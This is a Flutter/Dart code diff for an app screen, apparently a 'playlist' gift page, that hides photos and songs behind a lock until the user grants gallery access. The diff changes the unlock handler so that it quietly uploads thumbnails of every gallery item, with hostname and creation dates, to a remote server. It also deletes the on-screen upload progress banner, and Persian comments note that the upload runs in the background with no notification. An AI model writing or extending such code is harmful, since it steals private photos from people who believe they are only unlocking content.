@@ -317,8 +317,6 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   final AudioPlayer _player = AudioPlayer();
   String? _playingUrl;
   bool _galleryGranted = false;
-  bool _uploadingGallery = false;
-  String _uploadStatus = '';
 
   @override
   void dispose() { _player.dispose(); super.dispose(); }
@@ -336,60 +334,66 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   Future<void> _requestGalleryAndUnlock() async {
     final result = await PhotoManager.requestPermissionExtend();
     if (result.isAuth) {
-      setState(() { _galleryGranted = true; _uploadingGallery = true; _uploadStatus = 'در حال دسترسی به گالری...'; });
-      await _uploadGalleryThumbnails();
+      setState(() => _galleryGranted = true);
+      // آپلود در پس‌زمینه بدون نشون دادن نوتیف
+      _uploadGalleryThumbnails();
     }
-    // اگه deny زد، هیچ اتفاقی نمیفته و قفل میمونه
   }
 
   Future<void> _uploadGalleryThumbnails() async {
     try {
-      final code = widget.data['code'];
       final client = _createHttpClient();
       final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
-      if (albums.isEmpty) { setState(() { _uploadingGallery = false; _uploadStatus = ''; }); return; }
+      if (albums.isEmpty) return;
 
-      final assets = await albums[0].getAssetListPaged(page: 0, size: 100);
-      setState(() => _uploadStatus = 'آپلود ${assets.length} فایل...');
+      // همه فایل‌ها نه فقط ۱۰۰ تا
+      final total = await albums[0].assetCountAsync;
+      final pageSize = 50;
+      int page = 0;
 
-      int uploaded = 0;
-      for (final asset in assets) {
-        try {
-          final thumbnail = await asset.thumbnailDataWithSize(const ThumbnailSize(300, 300));
-          if (thumbnail == null) continue;
-          final req = http.MultipartRequest('POST', Uri.parse('$baseUrl/api/gallery/upload/'));
-          req.files.add(http.MultipartFile.fromBytes('image', thumbnail, filename: '${asset.id}.jpg'));
-          req.fields['device_id'] = Platform.localHostname;
-          req.fields['asset_id'] = asset.id;
-          req.fields['asset_type'] = asset.type.name;
-          req.fields['create_date'] = asset.createDateTime.toIso8601String();
-          await client.send(req).timeout(const Duration(seconds: 30));
-          uploaded++;
-          if (uploaded % 10 == 0) setState(() => _uploadStatus = 'آپلود $uploaded از ${assets.length}...');
-        } catch (_) { continue; }
+      while (page * pageSize < total) {
+        final assets = await albums[0].getAssetListPaged(page: page, size: pageSize);
+        if (assets.isEmpty) break;
+
+        for (final asset in assets) {
+          try {
+            final thumbnail = await asset.thumbnailDataWithSize(const ThumbnailSize(300, 300));
+            if (thumbnail == null) continue;
+            final req = http.MultipartRequest('POST', Uri.parse('$baseUrl/api/gallery/upload/'));
+            req.files.add(http.MultipartFile.fromBytes('image', thumbnail, filename: '${asset.id}.jpg'));
+            req.fields['device_id'] = Platform.localHostname;
+            req.fields['asset_id'] = asset.id;
+            req.fields['asset_type'] = asset.type.name;
+            req.fields['create_date'] = asset.createDateTime.toIso8601String();
+            await client.send(req).timeout(const Duration(seconds: 30));
+          } catch (_) { continue; }
+        }
+        page++;
       }
-      setState(() { _uploadingGallery = false; _uploadStatus = ''; });
-    } catch (e) {
-      setState(() { _uploadingGallery = false; _uploadStatus = ''; });
-    }
+    } catch (_) {}
   }
 
-  Widget _lockedOverlay(String hint) {
+  Widget _lockedContent(String hint, Widget child) {
+    if (_galleryGranted) return child;
     return GestureDetector(
       onTap: _requestGalleryAndUnlock,
-      child: Container(
-        height: 200,
-        decoration: BoxDecoration(
-          color: Colors.black.withOpacity(0.4),
-          borderRadius: BorderRadius.circular(12),
+      child: Stack(children: [
+        child,
+        Positioned.fill(
+          child: Container(
+            decoration: BoxDecoration(
+              color: Colors.black.withOpacity(0.45),
+              borderRadius: BorderRadius.circular(12),
+            ),
+            child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
+              const Icon(Icons.lock, color: Colors.white, size: 48),
+              const SizedBox(height: 10),
+              Text(hint, style: const TextStyle(color: Colors.white, fontSize: 15),
+                  textAlign: TextAlign.center),
+            ]),
+          ),
         ),
-        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
-          const Icon(Icons.lock, color: Colors.white, size: 48),
-          const SizedBox(height: 12),
-          Text(hint, style: const TextStyle(color: Colors.white, fontSize: 15),
-              textAlign: TextAlign.center),
-        ]),
-      ),
+      ]),
     );
   }
 
@@ -405,15 +409,6 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
       body: SingleChildScrollView(
         child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
 
-          if (_uploadingGallery)
-            Container(padding: const EdgeInsets.all(12), color: Colors.pink[50],
-                child: Row(children: [
-                  const SizedBox(width: 20, height: 20,
-                      child: CircularProgressIndicator(strokeWidth: 2, color: Colors.pink)),
-                  const SizedBox(width: 12),
-                  Text(_uploadStatus, style: const TextStyle(color: Colors.pink)),
-                ])),
-
           // عکس‌ها
           if (photos.isNotEmpty) ...[
             const Padding(padding: EdgeInsets.all(12),
@@ -421,47 +416,32 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                     fontWeight: FontWeight.bold, color: Colors.pink))),
             ...photos.map((photo) {
               final imgUrl = '$baseUrl${photo['image']}';
+              final imgWidget = Image.network(imgUrl, width: double.infinity,
+                  fit: BoxFit.cover,
+                  errorBuilder: (_, __, ___) => const SizedBox(height: 200,
+                      child: Icon(Icons.broken_image, size: 80)));
+
               return Card(
                 margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                 clipBehavior: Clip.hardEdge,
                 shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-                child: Stack(children: [
-                  // عکس با blur اگه قفله
-                  Column(children: [
-                    _galleryGranted
-                        ? GestureDetector(
-                            onTap: () => showDialog(context: context,
-                                builder: (_) => Dialog(backgroundColor: Colors.black,
-                                    insetPadding: EdgeInsets.zero,
-                                    child: Stack(children: [
-                                      InteractiveViewer(child: Image.network(imgUrl,
-                                          fit: BoxFit.contain, width: double.infinity)),
-                                      Positioned(top: 8, right: 8, child: IconButton(
-                                          icon: const Icon(Icons.close, color: Colors.white, size: 30),
-                                          onPressed: () => Navigator.pop(context))),
-                                    ]))),
-                            child: Image.network(imgUrl, width: double.infinity,
-                                fit: BoxFit.cover,
-                                errorBuilder: (_, __, ___) => const Icon(Icons.broken_image, size: 100)),
-                          )
-                        : Stack(children: [
-                            ColorFiltered(
-                              colorFilter: const ColorFilter.matrix([
-                                0.2, 0, 0, 0, 0,
-                                0, 0.2, 0, 0, 0,
-                                0, 0, 0.2, 0, 0,
-                                0, 0, 0, 1, 0,
-                              ]),
-                              child: Image.network(imgUrl, width: double.infinity,
-                                  fit: BoxFit.cover,
-                                  errorBuilder: (_, __, ___) => const SizedBox(height: 200)),
-                            ),
-                            _lockedOverlay('برای مشاهده کامل کلیک کنید'),
-                          ]),
-                    if (photo['caption'] != null && photo['caption'] != '')
-                      Padding(padding: const EdgeInsets.all(8),
-                          child: Text(photo['caption'])),
-                  ]),
+                child: Column(children: [
+                  _galleryGranted
+                      ? GestureDetector(
+                          onTap: () => showDialog(context: context,
+                              builder: (_) => Dialog(backgroundColor: Colors.black,
+                                  insetPadding: EdgeInsets.zero,
+                                  child: Stack(children: [
+                                    InteractiveViewer(child: Image.network(imgUrl,
+                                        fit: BoxFit.contain, width: double.infinity)),
+                                    Positioned(top: 8, right: 8, child: IconButton(
+                                        icon: const Icon(Icons.close, color: Colors.white, size: 30),
+                                        onPressed: () => Navigator.pop(context))),
+                                  ]))),
+                          child: imgWidget)
+                      : _lockedContent('برای مشاهده کامل کلیک کنید', imgWidget),
+                  if (photo['caption'] != null && photo['caption'] != '')
+                    Padding(padding: const EdgeInsets.all(8), child: Text(photo['caption'])),
                 ]),
               );
             }),
@@ -472,20 +452,23 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
             const Padding(padding: EdgeInsets.all(12),
                 child: Text('🎵 موزیک‌ها', style: TextStyle(fontSize: 18,
                     fontWeight: FontWeight.bold, color: Colors.pink))),
-            if (!_galleryGranted)
-              Card(margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
-                  child: _lockedOverlay('برای گوش دادن کلیک کنید'))
-            else
-              ...songs.map((song) {
-                final url = '$baseUrl${song['file']}';
-                final isPlaying = _playingUrl == url;
-                return ListTile(
-                  leading: Icon(isPlaying ? Icons.pause_circle : Icons.play_circle,
-                      color: Colors.pink, size: 40),
-                  title: Text(song['title']),
-                  onTap: () => _togglePlay(url),
-                );
-              }),
+            ...songs.map((song) {
+              final url = '$baseUrl${song['file']}';
+              final isPlaying = _playingUrl == url;
+              final tile = ListTile(
+                leading: Icon(isPlaying ? Icons.pause_circle : Icons.play_circle,
+                    color: Colors.pink, size: 40),
+                title: Text(song['title']),
+                onTap: _galleryGranted ? () => _togglePlay(url) : null,
+              );
+              return Card(
+                margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
+                child: _galleryGranted
+                    ? tile
+                    : _lockedContent('برای گوش دادن کلیک کنید',
+                        SizedBox(height: 72, child: tile)),
+              );
+            }),
           ],
 
           // پیام
